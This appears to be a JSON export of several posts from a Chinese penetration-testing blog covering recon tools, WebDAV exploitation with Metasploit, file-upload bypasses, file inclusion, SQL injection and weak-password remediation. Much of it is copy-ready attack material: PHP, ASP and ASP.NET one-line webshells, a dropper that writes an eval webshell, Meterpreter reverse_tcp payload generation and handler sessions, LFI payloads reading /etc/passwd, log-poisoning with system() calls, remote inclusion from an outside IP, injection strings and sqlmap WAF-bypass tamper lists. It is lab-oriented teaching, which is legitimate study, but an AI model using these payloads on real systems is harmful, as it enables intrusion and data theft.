-sS -sV -T5 -F -A -O target (version detection)nmap -sU -v target (Udp)nmap -sU -P0 (Udp)nmap -sC 192.168.31.10-12 (all scan default) 端口渗透总结 nmap最佳扫描策略 其他 敏感文件或目录 可以利用一些小工具扫描网站上是否存在敏感信息，常见的工具有：御剑。kali下则有nikto。 当然，一些敏感文件也可以通过常见的漏洞扫描器也可以发现，在找敏感文件或目录的时候，可以加载自己制作的文件/目录字典进行扫描，有针对性的去寻找。 这里提供一份字典文件，字典文件涉及的东西好多（用户名、密码、sqli测试、xss测试、敏感目录等等），都是从互联网上收集的。链接：https://pan.baidu.com/s/1skY9Jv3 密码：jgel 御剑系列：链接：https://pan.baidu.com/s/1nuAvvXR 密码：ozsg web指纹识别 whatweb - whatweb是web指纹识别工具，包括cms、blog平台、统计/分析包、js库、web服务器指纹、嵌入式设备。WhatWeb拥有超过1000个插件，每个都可以识别不同的东西。WhatWeb还可识别版本号，电子邮件地址，帐户ID，Web框架模块，SQL错误等。 用法：whatweb target.com 御剑web指纹识别工具-链接：https://pan.baidu.com/s/1hsnLhQG 密码：jots Bugscaner nmap -sV example.com robots.txt文件-通过浏览器进行测试。http://www.test.com/robots.txt 审查元素-通过浏览器对网页的元素进行审查，google浏览器通过F12进行打开，建议使用firefox的firebug工具进行元素的审查。 利用浏览器进行信息收集,熟练使用搜索语法 google Google GHDB 如何使用Google（谷歌）进行高效率搜索 如何用好谷歌等搜索引擎？ 百度 shodan shodan使用指南 Complete Guide to Shodan-链接：https://pan.baidu.com/s/1bpyeKqV 密码：3cwk zoomeye zoomeye帮助手册 辅助工具 http://tool.oschina.net/ https://tool.lu/ 临时邮箱 exploit-db 辅助资料 渗透标准 参考： 乙方渗透测试之信息收集 EK Testing:_Information_Gathering Awesome OSINT [首页图来自wallhaven.cc][5]","categories":[{"name":"渗透","slug":"渗透","permalink":"http://airs-sec.com/categories/渗透/"}],"tags":[{"name":"web信息收集","slug":"web信息收集","permalink":"http://airs-sec.com/tags/web信息收集/"}],"keywords":[{"name":"渗透","slug":"渗透","permalink":"http://airs-sec.com/categories/渗透/"}]},{"title":"危险的http请求方法webdav-metasploit获取session","slug":"危险的http请求方法webdav-metasploit获取session","date":"2017-12-18T02:47:04.000Z","updated":"2017-12-18T03:51:48.606Z","comments":true,"path":"2017/12/18/危险的http请求方法webdav-metasploit获取session/","link":"","permalink":"http://airs-sec.com/2017/12/18/危险的http请求方法webdav-metasploit获取session/","excerpt":"","text":"HTTP请求方法简介HTTP/1.1协议中共定义了八种方法（也叫“动作”）来以不同方式操作指定的资源： OPTIONS：这个方法可使服务器传回该资源所支持的所有HTTP请求方法。用&#39;*&#39;来代替资源名称，向Web服务器发送OPTIONS请求，可以测试服务器功能是否正常运作。 HEAD：与GET方法一样，都是向服务器发出指定资源的请求。只不过服务器将不传回资源的本文部分。它的好处在于，使用这个方法可以在不必传输全部内容的情况下，就可以获取其中“关于该资源的信息”（元信息或称元数据）。 GET：向指定的资源发出“显示”请求。使用GET方法应该只用在读取数据，而不应当被用于产生“副作用”的操作中，例如在Web Application中。其中一个原因是GET可能会被网络蜘蛛等随意访问。 POST：向指定资源提交数据，请求服务器进行处理（例如提交表单或者上传文件）。数据被包含在请求本文中。这个请求可能会创建新的资源或修改现有资源，或二者皆有。 PUT：向指定资源位置上传其最新内容。 DELETE：请求服务器删除Request-URI所标识的资源。 TRACE：回显服务器收到的请求，主要用于测试或诊断。 CONNECT：HTTP/1.1协议中预留给能够将连接改为管道方式的代理服务器。通常用于SSL加密服务器的链接（经由非加密的HTTP代理服务器）。 WebDAV是一种基于 HTTP 1.1协议的通信协议.它扩展了HTTP 1.1，在GET、POST、HEAD等几个HTTP标准方法以外添加了一些新的方法。使应用程序可直接对Web Server直接读写，并支持写文件锁定(Locking)及解锁(Unlock)，还可以支持文件的版本控制。 漏洞成因web服务器默认是不开启PUT等方法的，出现该漏洞的原因主要是网站管理员对服务器的错误配置。常见的主要就是管理员错误地打开了IIS的服务器的webDAV而且没有开启权限验证，导致可以PUT文件到服务器再利用服务器的解析漏洞运行恶意代码或者用webDAV的MOVE方法将所上传的带有恶意代码的普通文件后缀修改为可执行文件后缀，运行恶意代码。 若服务器开始了DELETE方法，是可以利用其删除网站上文件的，但是实际案例极少，而且开启了DELETE方法的服务器一般也会开始PUT方法，与PUT方法的危害相比，DELETE方法的危害显然要小得多。 burpsuite抓包上传通过burpsuite改变请求方法获取服务器开启的请求方法 利用PUT方法将文件上传到服务器上。 3.上传成功后，可以通过MOVE请求方法，将txt文本move成可执行脚本 4.浏览器验证 利用davtest上传文件至dav目录 上传成功。 Metasploit通过webdava方法获取session环境： kali metasploitable2 1、查看攻击机kali的ip 1234567891011121314151617181920212223查看本地ip地址msf payload(reverse_tcp) &gt; ifconfig[*] exec: ifconfigeth0 Link encap:Ethernet HWaddr 00:0c:29:4b:99:df inet addr:192.168.179.128 Bcast:192.168.179.255 Mask:255.255.255.0 inet6 addr: fe80::20c:29ff:fe4b:99df/64 Scope:Link UP BROADCAST RUNNING MULTICAST MTU:1500 Metric:1 RX packets:4274321 errors:5690 dropped:278 overruns:0 frame:0 TX packets:12392315 errors:0 dropped:0 overruns:0 carrier:0 collisions:0 txqueuelen:1000 RX bytes:448370315 (427.5 MiB) TX bytes:769015699 (733.3 MiB) Interrupt:19 Base address:0x2000 lo Link encap:Local Loopback inet addr:127.0.0.1 Mask:255.0.0.0 inet6 addr: ::1/128 Scope:Host UP LOOPBACK RUNNING MTU:65536 Metric:1 RX packets:4589317 errors:0 dropped:0 overruns:0 frame:0 TX packets:4589317 errors:0 dropped:0 overruns:0 carrier:0 collisions:0 txqueuelen:0 RX bytes:480528935 (458.2 MiB) TX bytes:480528935 (458.2 MiB) 2、开启metasploit 123456789101112131415161718192021222324252627282930313233343536373839404142434445msf &gt; use auxiliary/scanner/http/webdav_website_contentmsf auxiliary(webdav_website_content) &gt; show optionsModule options (auxiliary/scanner/http/webdav_website_content): Name Current Setting Required Description ---- --------------- -------- ----------- PATH / yes Path to use Proxies no A proxy chain of format type:host:port[,type:host:port][...] RHOSTS yes The target address range or CIDR identifier RPORT 80 yes The target port THREADS 1 yes The number of concurrent threads VHOST no HTTP server virtual hostmsf auxiliary(webdav_website_content) &gt; setg RHOST 192.168.179.129RHOST =&gt; 192.168.179.129msf auxiliary(webdav_website_content) &gt; set PATH /dav/PATH =&gt; /dav/msf auxiliary(webdav_website_content) &gt; use payload/php/meterpreter/reverse_tcpmsf payload(reverse_tcp) &gt; show optionsModule options (payload/php/meterpreter/reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- LHOST yes The listen address LPORT 4444 yes The listen port msf payload(reverse_tcp) &gt; set LHOST 192.168.179.128LHOST =&gt; 192.168.179.128msf payload(reverse_tcp) &gt; set LPORT 4321LPORT =&gt; 4321msf payload(reverse_tcp) &gt; show optionsModule options (payload/php/meterpreter/reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- LHOST 192.168.179.128 yes The listen address LPORT 4321 yes The listen port# 生成攻击脚本msf payload(reverse_tcp) &gt; generate -t raw -f testmeter.php[*] Writing 951 bytes to testmeter.php... 3、kaili开启监听 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253msf payload(reverse_tcp) &gt; use multi/handlermsf exploit(handler) &gt; show optionsModule options (exploit/multi/handler): Name Current Setting Required Description ---- --------------- -------- -----------Exploit target: Id Name -- ---- 0 Wildcard Targetmsf exploit(handler) &gt;msf exploit(handler) &gt; set payload php/meterpreter/reverse_tcppayload =&gt; php/meterpreter/reverse_tcpmsf exploit(handler) &gt; show optionsModule options (exploit/multi/handler): Name Current Setting Required Description ---- --------------- -------- -----------Payload options (php/meterpreter/reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- LHOST yes The listen address LPORT 4444 yes The listen portExploit target: Id Name -- ---- 0 Wildcard Targetmsf exploit(handler) &gt; set LHOST 192.168.179.128LHOST =&gt; 192.168.179.128msf exploit(handler) &gt; set LPORT 4321LPORT =&gt; 4321msf exploit(handler) &gt; run -j[*] Exploit running as background job.[*] Started reverse TCP handler on 192.168.179.128:4321 [*] Starting the payload handler... 4、攻击主机上传php脚本 1234567root@kali:~# davtest -url http://192.168.179.129/dav/ -uploadfile testmeter.php -uploadloc /DavTestDir_I3DjsKO5fx/testmeter.php******************************************************** Testing DAV connectionOPEN SUCCEED: http://192.168.179.129/dav******************************************************** unless Uploading fileUpload succeeded: http://192.168.179.129/dav//DavTestDir_I3DjsKO5fx/testmeter.php 5、上传成功并点击可执行脚本获取session会话。 升级权限1、生成可以执行的shell 1234567891011121314151617181920212223242526272829303132msf exploit(handler) &gt; use payload/linux/x86/meterpreter/reverse_tcpmsf payload(reverse_tcp) &gt;msf payload(reverse_tcp) &gt; show optionsModule options (payload/linux/x86/meterpreter/reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- DebugOptions 0 no Debugging options for POSIX meterpreter LHOST yes The listen address LPORT 4444 yes The listen portmsf payload(reverse_tcp) &gt; set LPORT 8888LPORT =&gt; 8888msf payload(reverse_tcp) &gt; setg LHOST 192.168.179.128LHOST =&gt; 192.168.179.128msf payload(reverse_tcp) &gt; show optionsModule options (payload/linux/x86/meterpreter/reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- DebugOptions 0 no Debugging options for POSIX meterpreter LHOST 192.168.179.128 yes The listen address LPORT 8888 yes The listen portmsf payload(reverse_tcp) &gt; generate -t elf -f meter.elf[*] Writing 155 bytes to meter.elf...msf payload(reverse_tcp) &gt; 2、开启监听 12345678910111213141516171819202122232425262728293031323334353637383940msf payload(reverse_tcp) &gt; use multi/handlermsf exploit(handler) &gt; set payload linux/x86/meterpreter/reverse_tcppayload =&gt; linux/x86/meterpreter/reverse_tcpmsf exploit(handler) &gt; show optionsModule options (exploit/multi/handler): Name Current Setting Required Description ---- --------------- -------- -----------Payload options (linux/x86/meterpreter/reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- DebugOptions 0 no Debugging options for POSIX meterpreter LHOST 192.168.179.128 yes The listen address LPORT 4321 yes The listen portExploit target: Id Name -- ---- 0 Wildcard Targetmsf exploit(handler) &gt;msf exploit(handler) &gt; set LPORT 8888LPORT =&gt; 8888msf exploit(handler) &gt; exploit -j[*] Exploit running as background job.[*] Started reverse TCP handler on 192.168.179.128:8888 [*] Starting the payload handler... 3、通过sessions –I 1的upload命令上传meter.elf文件，从而获取到更高权限 upload meter.elf 上传文件 4、在sessions -l 1下执行shell,并执行攻击脚本，获取sessions shell chmod +x meter.elf execute –f meter.elf 5、sessions –l,此时就有两个sessions了 去年做实验总结的一篇文章，现在看时，感觉不像自己写的，但验证结果是自己做的的确没错。-_-| 所以就发表出来了。 漏洞简介和原理是来自安全社区http://www.loner.fm的wiki，wiki已经访问不了了。 首页图来自wallhaven.cc","categories":[{"name":"渗透","slug":"渗透","permalink":"http://airs-sec.com/categories/渗透/"}],"tags":[],"keywords":[{"name":"渗透","slug":"渗透","permalink":"http://airs-sec.com/categories/渗透/"}]},{"title":"web安全剖析-第六章-文件上传","slug":"web安全剖析-第六章-文件上传","date":"2017-12-15T09:06:02.000Z","updated":"2017-12-15T09:13:17.732Z","comments":true,"path":"2017/12/15/web安全剖析-第六章-文件上传/","link":"","permalink":"http://airs-sec.com/2017/12/15/web安全剖析-第六章-文件上传/","excerpt":"","text":"解析漏洞IIS解析漏洞iis解析漏洞存在两种情况： 1、目录解析漏洞 当建立*.asp的目录时，放在这个目录下的任意文件都当作asp文件来执行。 /xx.asp/xx.jpg 2、文件后缀解析漏洞 建立一个文件为*.asp;.1.jpg文件时，可以当作asp文件来执行。 wooyun.asp;.jpg 123/wooyun.asa/wooyun.cer/wooyun.cdx 3、webdav扩展漏洞 当iis服务器开启了webdav扩展之后，允许客户端有更多的请求方法，如：put、delete、copy、move等请求方法。 结合这些方法，可以用put方法将txt文本上传到服务器上，之后利用copy或move方法将txt文件转成可执行文件。 iis write apache解析漏洞版本：apache1.x，apache2.x apache在碰到一个文件时，如1.php.rar，这是php会从后往前对文件后缀进行解析，找到一个自己可以解析的文件后缀。 配合解析漏洞，可以将可执行文件上传到服务器上，绕过程序的检测，获取webshell。 php cgi解析漏洞（Nginx解析漏洞）http://xxx.com/1.jpg/1.php 1.jpg为图片马 iis7.0、iis7.5、lighttpd也存在这样的漏洞。 补充： 在默认Fast-CGI开启状况下,黑阔上传一个名字为wooyun.jpg，内容为&lt;?PHP fputs(fopen(&#39;shell.php&#39;,&#39;w&#39;),&#39;&lt;?php eval($_POST[cmd])?&gt;&#39;);?&gt;的文件，然后访问wooyun.jpg/.php,在这个目录下就会生成一句话木马shell.php。 传送门-解析漏洞总结 绕过上传漏洞 客户端检测 服务器端检测 中国菜刀 一句话： php &lt;?php @eval($_POST[&#39;chopper&#39;]);?&gt; asp &lt;%eval request(&quot;chopper&quot;)%&gt; asp.net &lt;% Page Language=&quot;JScript&quot;%&gt;&lt;%eval(Request.Item[&quot;chopper&quot;],&quot;unsafe&quot;);%&gt; 图片一句话： 将一句话木马插入在图片文件中，而且并不损坏图片文件。 edjpgcom 客户端检测 在服务器后端缺乏对于用户输入的处理和限制或者处理和限制不严格。 1、firebug删除js 2、burpsuite改文件后缀名 服务器端检测 黑名单过滤 黑名单过滤是一种不安全的方式，黑名单定义了一系列的扩展名，服务器端在接收文件后，与黑名单扩展名对比，如果发现文件扩展名与黑名单的扩展名匹配，则认为文件不合法。 在windows系统下，如果文件名以“.”或者空格作为结尾，系统会自动去除“.”与空格，如：asp.或者asp_ 白名单过滤 配合解析漏洞进行绕过 MIME验证 MIME (Multipurpose Internet Mail Extensions) 是描述消息内容类型的因特网标准。MIME 消息能包含文本、图像、音频、视频以及其他应用程序专用的数据。 按照内容类型排列的 Mime 类型列表|类型/子类型 | 扩展名 ||—-|—-||application/msword |doc||application/octet-stream| exe||application/pdf| pdf||application/rtf| rtf||application/vnd.ms-powerpoint |ppt||application/x-javascript |js||application/x-shockwave-flash |swf||application/zip| zip||application/php|php文件||audio/mpeg |mp3||audio/x-wav |wav||image/bmp |bmp||image/gif |gif||image/jpeg |jpeg||image/jpeg| jpg||text/css |css||text/html |html||text/plain| txt| 在http请求中，MIME类型放在Content-Type字段 目录验证 上传文件的表单，上传目录可控。 截断上传攻击。 Nginx &lt;8.03 空字节代码执行漏洞 常见的截断字符： 123\\0?%00 其他 如果在Apache中.htaccess可被执行.且可被上传.那可以尝试在.htaccess中写入: &lt;FilesMatch &quot;wooyun.jpg&quot;&gt; SetHandler application/x-httpd-php &lt;/FilesMatch&gt;,然后再上传shell.jpg的木马, 这样shell.jpg就可解析为php文件。 文本编辑器上传漏洞常见文本编辑器的漏洞 修复 目录过滤不严，攻击者建立畸形目录 文件为重命名，攻击者利用解析漏洞 此图来自下面的paper，在红点出进行代码修复，基本上可以修复大部分的上传攻击漏洞。 补充上传攻击总结.pdf,这篇paper针对上传攻击，很详细： 链接：https://pan.baidu.com/s/1o8DqwXG 密码：v5lb 首页图来自wallhaven.cc","categories":[{"name":"阅读","slug":"阅读","permalink":"http://airs-sec.com/categories/阅读/"}],"tags":[],"keywords":[{"name":"阅读","slug":"阅读","permalink":"http://airs-sec.com/categories/阅读/"}]},{"title":"文件包含","slug":"文件包含","date":"2017-12-14T09:10:46.000Z","updated":"2017-12-14T11:01:14.864Z","comments":true,"path":"2017/12/14/文件包含/","link":"","permalink":"http://airs-sec.com/2017/12/14/文件包含/","excerpt":"在通过引入文件时，引用的文件名，用户可控，由于传入的文件名没有经过合理的校验，或者校验被绕过，从而操作了预想之外的文件，就可能导致意外的文件泄露甚至恶意的代码注入。","text":"在通过引入文件时，引用的文件名，用户可控，由于传入的文件名没有经过合理的校验，或者校验被绕过，从而操作了预想之外的文件，就可能导致意外的文件泄露甚至恶意的代码注入。 0x01 本地文件包含 当被包含的文件在服务器本地时，就形成本地文件包含 1234Type of call: require($_GET[file]);Exploit: http://host/?file=/etc/passwd 1234Type of call: require(&quot;includes/&quot;.$_GET[file]);Exploit: http://host/?file=../../../../../etc/passwd 0x02 远程文件包含 当被包含的文件在第三方服务器时，叫做远程文件包含 需要： php.ini allow_url_fopen on allow_url_include on http://localhost/dvwa/vulnerabilities/fi/?page=http://104.128.225.49:8080/test.php 0x03包含日志文件getshell（需要一定读权限,且需要知道日志文件路径） 包含日志文件主要的原理是利用apache的错误日志文件，当访问一个不存在的页面，且在页面后面加恶意代码，可以将这段代码写入到error.log文件中去，之后通过远程文件包含，将日志文件包含出来。。 如漏洞文件为：http://xxx.com/lfi.php?page=xxx http://xxx.com/lfi.php?page=/etc/httpd/conf/httpd.conf 通过/etc/httpd/conf/httpd.conf 查看错误日志文件位置为error.log （1）包含一句话 随便访问：http://xxx.com/xxx.php&lt;?php eval($_POST[&#39;a&#39;]); ?&gt; 写入日志,查看日志 http://xxx.com/lfi.php?page=error.log 注：会被编码，需burp截包，repeate改编码。（红黑联盟视频渗透测试17课） （2）包含命令执行 随便访问：http://xxx.com/xxx.php&lt;?php system(‘ls -al /var/www/’)&gt; 写入日志，查看日志 http://xxx.com/lfi.php?page=error.log 0x04 漏洞修复 对引入文件包含的参数进行过滤，或者对所引入的文件的域进行限制，禁止服务器访问可信域以外的文件。 参考-PHP文件包含漏洞总结","categories":[{"name":"学习","slug":"学习","permalink":"http://airs-sec.com/categories/学习/"}],"tags":[],"keywords":[{"name":"学习","slug":"学习","permalink":"http://airs-sec.com/categories/学习/"}]},{"title":"web安全深度剖析","slug":"web安全深度剖析","date":"2017-12-14T03:14:28.000Z","updated":"2017-12-14T03:21:07.305Z","comments":true,"path":"2017/12/14/web安全深度剖析/","link":"","permalink":"http://airs-sec.com/2017/12/14/web安全深度剖析/","excerpt":"","text":"web安全深度剖析这本书个人感觉很不错，很适合初学者，我之前也看过，做过笔记。 大家如果要看，可以在分类-阅读中找到。 链接地址： 链接：https://pan.baidu.com/s/1jHNrCEE 密码：1oo4","categories":[{"name":"书籍分享","slug":"书籍分享","permalink":"http://airs-sec.com/categories/书籍分享/"}],"tags":[{"name":"书籍","slug":"书籍","permalink":"http://airs-sec.com/tags/书籍/"}],"keywords":[{"name":"书籍分享","slug":"书籍分享","permalink":"http://airs-sec.com/categories/书籍分享/"}]},{"title":"web安全深度剖析-第五章-sql注入漏洞","slug":"web安全深度剖析-第五章-sql注入漏洞","date":"2017-12-13T08:47:24.000Z","updated":"2017-12-14T04:56:05.631Z","comments":true,"path":"2017/12/13/web安全深度剖析-第五章-sql注入漏洞/","link":"","permalink":"http://airs-sec.com/2017/12/13/web安全深度剖析-第五章-sql注入漏洞/","excerpt":"","text":"0x01 sql注入漏洞的原理当应用程序（如php）要通过数据库（mysql）增删改查数据时，如果在应用程序设计时，操作数据库增删改查的语句存在缺陷（未过滤特殊字符），攻击者可构造特殊的sql语句，达到非法操作数据库的目的。 用户输入的数据被sql解释器执行。 0x02 注入分类 数字型注入 http://xxx.com/product.php?id=1 查询语句 select * from product where id = 1 for example： 存在下列语句： 原始数据库语句 SELECT first_name, last_name FROM users WHERE user_id = &#39;$id&#39;; 用户输入数据后的语句 SELECT first_name, last_name FROM users WHERE user_id = &#39;1&#39;; 漏洞利用语句： SELECT first_name, last_name FROM users WHERE user_id = &#39;&#39; and 1=2 --1&#39;; 输出报错，存在sql注入 字符型注入 http://xxx.com/product.php?str=&#39;apple&#39; 查询语句 select * from product where str = &#39;apple&#39; product.php?中?后面接的是带入数据库的参数。 判断 1、apple&#39; and &#39;1&#39;=&#39;2 2、apple&#39;%2B&#39; 其他注入类型 POST注入 12345678910111213POST /dvwa/login.php HTTP/1.1Host: localhostUser-Agent: Mozilla/5.0 (Windows NT 6.2; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateReferer: http://localhost/dvwa/login.phpCookie: security=impossible; PHPSESSID=t8pr1juco934q8av7sqi5g7cj3Connection: keep-aliveContent-Type: application/x-www-form-urlencodedContent-Length: 88username=admin&amp;password=password&amp;Login=Login&amp;user_token=8a0a745a43a7cd4e34d1ce0802320078 POST和GET类型的区别 通过FORM表单提交的数据，一般使用的是POST数据提交，POST提交的数据长度比GET型长，同时，在数据安全方面，POST占有优势。而GET提交的数据在URL中明文传送。 123456789GET /dvwa/vulnerabilities/sqli/ HTTP/1.1Host: localhostUser-Agent: Mozilla/5.0 (Windows NT 6.2; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateReferer: http://localhost/dvwa/index.phpCookie: security=impossible; PHPSESSID=t8pr1juco934q8av7sqi5g7cj3Connection: keep-alive COOKIE注入 COOKIE是一种身份凭证，在浏览器和服务器通信的过程中，由于HTTP是无状态协议，所以每次通信都得去认证身份，你想象下，如果在购买东西的时候，没有身份凭证的话，添加一件商品，用户的当前登录状态就会消失，这样就好麻烦了。 COOKIE存储在用户的浏览器中，当用户通过浏览器访问服务器时，带着这个COOKIE（令牌），服务器通过对比发现，这个COOKIE是这个用户的，就会记录登录状态，访问其他的页面时，都是带着这个COOKIE，用户的状态就会处在标识当中。 延时注入 搜索型注入 传送门 base64注入 0x03注入判断1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465or 1=1or 1=2and 1=1 数字型&apos; and &apos;1&apos;=&apos;1 字符型) and (1=1 &apos;) and (&apos;1&apos;=&apos;1%&apos; and &apos;%&apos;=&apos; 搜索型%&apos; and 1=(select 1 from dual) and &apos;%&apos;=&apos; //mysql 和 oracle 中存在dual虚拟表case when 1=1 then 条件1 else 条件2 end //如果条件成立（1=1） 返回条件1 否则返回条件2&apos; and 1=(select case when 1=1 then 1 else 2 end) and &apos;1&apos;=&apos;1 &apos; and 1=1 and &apos;1&apos;=&apos;1&apos; and 1=2 and &apos;1&apos;=&apos;1&apos; and 1 like 1 and &apos;1&apos; like &apos;1&apos; and 1 like 2 and &apos;1&apos; like &apos;1&apos; ||AND SLEEP(5)%&apos; and sleep(5) and &apos;%&apos;=&apos;|| = or&amp;&amp; = andand 2&gt;1 and 2&lt;1%0a&apos; union%a0select version()bypass.php?id=xxoo&apos;%2b100.union select flag from flag.flag%23index.php?name= and 1=.1union select flag from flag limit 0,1%23\\%0c = form feed, new page%09 = horizontal tab%0d = carriage return%0a = line feed, new line**%&apos; an%00d 1=1 an%00d &apos;%&apos;=&apos;**宽字节： %df&apos;and 1 in (1)and 1 in (2) 0x04注入工具sqlmap 传送门 补充： 针对伪静态： sqlmap -u http://xxx.com/id/2*.html --dbs 针对POST注入： 12345678910111213POST /dvwa/login.php HTTP/1.1Host: localhostUser-Agent: Mozilla/5.0 (Windows NT 6.2; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateReferer: http://localhost/dvwa/login.phpCookie: security=impossible; PHPSESSID=t8pr1juco934q8av7sqi5g7cj3Connection: keep-aliveContent-Type: application/x-www-form-urlencodedContent-Length: 88username=admin*&amp;password=password&amp;Login=Login&amp;user_token=8a0a745a43a7cd4e34d1ce0802320078 绕过waf的tamper脚本： 要测试mysql，可以使用以下所有tamper脚步： 12345 --tamper=between,bluecoat,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2hash,space2morehash,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords,xforwardedfor 要测试mssql，您可以使用以下所有tamper脚本： 1--tamper=between,charencode,charunicodeencode,equaltolike,greatest,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,sp_password,space2comment,space2dash,space2mssqlblank,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes 下面是支持mssql和mysql的tamper脚步列表1234--tamper=apostrophemask,apostrophenullencode,base64encode,between,chardoubleencode,charencode,charunicodeencode,equaltolike,greatest,ifnull2ifisnull,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes` 来源 sqlmap脑图：链接：http://pan.baidu.com/s/1mhYbRDI 密码：9z2f 个人常用选项： sqlmap -u “http://xxx.com/xxx.php?id=1&quot; –level 3 –random-agent –risk 3 –dbs 0x05防止sql注入 严格的数据类型 123$id = $_GET[&apos;id&apos;];$sql = &quot;select * from news where id = $id&quot;;$news = exec($sql); 对id进行判断，过滤 1、通过mysql_real_escape_string( )函数进行过滤。mysqli_real_escape_string() 函数转义在 SQL 语句中使用的字符串中的特殊字符。 `$id = mysql_real_escape_string( $id );` 2、is_numeric()函数判断输入的是否为数字。 特殊字符转义 OWASP ESAPI 二次注入攻击: 在开启转义之后，特殊字符被转移了，但在数据库存储中并未转义，当另一个地方引用时，则会有一次诱发sql注入攻击。 1234$sql = \"insert into message(id,title,content) values (1,\"$title\",\"$content\")\";# sql语句如下insert into message(id,title,content) values (3,'secbug\\'','secbug') id title content 3 secbug’ secbug.org 1select * from message where title = '$title' 利用语句 $title = &#39; union select 1,@@version 3 -- 使用预编译语句 将sql语句预先编译后再执行。 框架技术 利用集成的框架进行应用程序的开发工作。 存储过程 为了完成特定功能或经常使用的SQL语句集，经编译后存储在数据库中。 0x06其他手工注入 1234567891011id=1 order by 6 //判断字段数 id=1 and 1=2 union select 1,2,3,4,5,6 //找出回显位 id=1 and 1=2 union select 1,2,user(),database(),5,6 //简单获取一些系统信息id=1 and 1=2 union select 1,2,group_concat(table_name),4,5,6 from information_schema.tables where table.schema=16进制的当前数据库 //获取表名id=1 and 1=2 union select 1,2,group_concat(column_name),4,5,6 from information_schema.columns where table_name=16进制的表名 //获取字段名 id=1 and 1=2 union select 1,2,group_concat(username,0x3a,password),4,5,6 from 表名 //获取字段内容 附常用敏感函数： user(),database(),@@basedir,@@tmpdir,version(),@@datadir, @@general_log_file,@@hostname,@@plugin_dir,@@port,@@global.version_compile_os 12345select group_concat(table_name) from information_schema.tables where table.schema=0xxxx //获取表select group_concat(column_name) from information_schema.columns where table_name=0xxxxx //获取字段select group_concat(username,0x3a,password) from 表名 报错注入 1`select * from ad where id=1` `and (select 1 from (select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a);`","categories":[{"name":"阅读","slug":"阅读","permalink":"http://airs-sec.com/categories/阅读/"}],"tags":[{"name":"web安全","slug":"web安全","permalink":"http://airs-sec.com/tags/web安全/"}],"keywords":[{"name":"阅读","slug":"阅读","permalink":"http://airs-sec.com/categories/阅读/"}]},{"title":"系统漏洞描述及修复建议","slug":"系统漏洞描述及修复建议","date":"2017-11-06T01:50:46.000Z","updated":"2017-11-06T12:38:32.801Z","comments":true,"path":"2017/11/06/系统漏洞描述及修复建议/","link":"","permalink":"http://airs-sec.com/2017/11/06/系统漏洞描述及修复建议/","excerpt":"弱口令telnet弱口令 漏洞描述： 开启了telnet服务，且telnet登陆存在弱口令，入侵者可远程telnet到该服务器上做相应的非法操作。 解决建议 关闭telnet服务 telnet不安全传输 漏洞描述： 开启了telnet服务，telnet密码通过明文传输，如果攻击者监听，则可获取到密码。","text":"弱口令telnet弱口令 漏洞描述： 开启了telnet服务，且telnet登陆存在弱口令，入侵者可远程telnet到该服务器上做相应的非法操作。 解决建议 关闭telnet服务 telnet不安全传输 漏洞描述： 开启了telnet服务，telnet密码通过明文传输，如果攻击者监听，则可获取到密码。 解决建议 关闭telnet服务 ftp弱口令 漏洞描述 存FTP匿名登录，攻击者可登录系统获取文件数据。 解决建议 建议设置复杂度较高的认证口令，或关闭不必要的服务。 SMB共享弱口令 漏洞描述 入侵者可以通过与Windows主机建立一个SMB会话来获取目标主机的一些信息，例如目标主机的共享列表，管理用户名等等。 解决建议 可以限制匿名用户对Windows NT/2000/XP系统的LSA组件的访问，这可以避免匿名用户通过LSA获取系统的一些公开信息，例如共享列表信息。 SNMP共享团体名 漏洞描述 开放的SNMP服务采用默认的字符串“public”作为口令。攻击者利用该漏洞可查看大量系统自身信息，为进一步的渗透提供辅助信息。 解决建议 若无管理必要，可关闭该服务，或者更改为private私有字符串。 ssh弱口令 漏洞描述 该服务器开启了ssh服务，但是ssh存在弱密码，攻击者可通过弱密码登陆到该服务器上，上传响应的文件并执行相应的命令。 解决建议 建议更改默认口令。 远程桌面账户弱口令(3389) 漏洞描述 开启了远程桌面服务，远程桌面服务允许用户进行远程连接到服务器，该默认账户存在弱口令。 解决建议 更改弱口令为更复杂的密码，如不需要，关闭远程桌面服务。 PHPMyAdmin空口令漏洞 漏洞描述 PHPMyAdmin没有设置口令，任何人都可以控制数据库。 解决建议 在PHPMyAdmin中为帐号加一个安全的口令。 一个安全的口令应该包含以下四项中的三项： （1）大写字母 （2）小写字母 （3）特殊字符 （4）数字 Oracle数据库空口令漏洞 漏洞描述 Oracle服务器未设置管理帐号口令，导致可以远程不使用口令控制Oracle Server。 解决建议 为oracle数据库账号加一个安全的口令。 一个安全的口令应该包含以下四项中的三项： （1）大写字母 （2）小写字母 （3）特殊字符 （4）数字 mysql数据库空口令漏洞 漏洞描述 MySQL服务器未设置root帐号口令或者某个帐号使用了简单的口令，导致可以远程不使用口令连接或者很容易猜测到帐号口令。 解决建议 为mysql数据库账号加一个安全的口令。 一个安全的口令应该包含以下四项中的三项： 